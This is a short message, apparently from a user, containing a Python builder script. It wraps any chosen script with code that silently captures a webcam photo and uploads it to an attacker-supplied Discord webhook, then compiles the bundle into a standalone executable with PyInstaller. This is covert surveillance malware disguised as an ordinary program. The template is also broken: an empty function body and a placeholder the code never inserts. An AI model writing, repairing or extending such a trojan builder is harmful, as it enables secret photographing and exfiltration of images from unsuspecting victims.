User
import os
import subprocess

def create_created_py(user_script_path, webhook_url):
    base_script = f"""
import os
import cv2
import requests
import json

def take_photo():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: -1")
        return None
    ret, frame = cap.read()
    cap.release()
    if not ret:
        print("Error: -2")
        return None
    photo_path = "photo.jpg"
    cv2.imwrite(photo_path, frame)
    return photo_path

def send_photo(webhook_url, photo_path):
    with open(photo_path, 'rb') as f:
        files = {{'file': (photo_path, f)}}
        response = requests.post(webhook_url, files=files)

def execute_user_script():

if __name__ == '__main__':
    webhook_url = '{webhook_url}'
    photo_path = take_photo()
    if photo_path:
        send_photo(webhook_url, photo_path)
    execute_user_script()
    """
    
    with open(user_script_path, 'r') as file:
        user_script = file.read()
    
    base_script = base_script.replace("# User script execution placeholder", user_script)
    
    with open('created.py', 'w') as file:
        file.write(base_script)

def build_exe():
    subprocess.run(['pyinstaller', '--onefile', 'created.py'], check=True)

def main():
    webhook_url = input("Please Enter Discord WebHook: ")
    user_script_path = input("Please enter the path to the Python script to include: ")
    create_created_py(user_script_path, webhook_url)
    build_exe()
    print("created.py has been converted to an executable.")

if __name__ == '__main__':
    main()
